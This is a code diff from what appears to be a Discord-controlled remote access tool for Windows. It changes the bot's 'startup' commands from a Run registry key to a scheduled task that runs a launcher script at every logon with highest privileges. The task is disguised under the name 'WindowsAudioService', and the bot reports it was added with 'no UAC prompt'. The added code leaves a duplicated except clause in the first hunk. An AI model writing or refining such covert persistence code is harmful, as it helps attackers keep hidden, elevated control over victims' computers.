@@ -734,14 +734,18 @@ async def startup(interaction: discord.Interaction):
     if not authorized(interaction.user.id):
         return await deny(interaction)
     try:
-        import winreg
-        # Point to launcher.bat in the same directory as this script
         bat_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "launcher.bat")
-        run_cmd = f'cmd /c start /min "" "{bat_path}"'
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
-        winreg.SetValueEx(key, "WindowsAudioService", 0, winreg.REG_SZ, run_cmd)
-        winreg.CloseKey(key)
-        await interaction.response.send_message("✅ Added to startup as `WindowsAudioService`.")
+        script = (
+            f'$action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c \\"{bat_path}\\"";'
+            '$trigger = New-ScheduledTaskTrigger -AtLogOn;'
+            '$principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Highest;'
+            '$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries;'
+            'Register-ScheduledTask -TaskName "WindowsAudioService" -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force'
+        )
+        subprocess.run(["powershell", "-Command", script], capture_output=True)
+        await interaction.response.send_message("✅ Added to startup as `WindowsAudioService` (no UAC prompt).")
+    except Exception as e:
+        await interaction.response.send_message(f"❌ Error: {e}")
     except Exception as e:
         await interaction.response.send_message(f"❌ Error: {e}")
 
@@ -751,13 +755,16 @@ async def startup_prefix(ctx):
     if not authorized(ctx.author.id):
         return await ctx.send("❌ You're not authorized.")
     try:
-        import winreg
         bat_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "launcher.bat")
-        run_cmd = f'cmd /c start /min "" "{bat_path}"'
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
-        winreg.SetValueEx(key, "WindowsAudioService", 0, winreg.REG_SZ, run_cmd)
-        winreg.CloseKey(key)
-        await ctx.send("✅ Added to startup as `WindowsAudioService`.")
+        script = (
+            f'$action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c \\"{bat_path}\\"";'
+            '$trigger = New-ScheduledTaskTrigger -AtLogOn;'
+            '$principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Highest;'
+            '$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries;'
+            'Register-ScheduledTask -TaskName "WindowsAudioService" -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force'
+        )
+        subprocess.run(["powershell", "-Command", script], capture_output=True)
+        await ctx.send("✅ Added to startup as `WindowsAudioService` (no UAC prompt).")
     except Exception as e:
         await ctx.send(f"❌ Error: {e}")
 
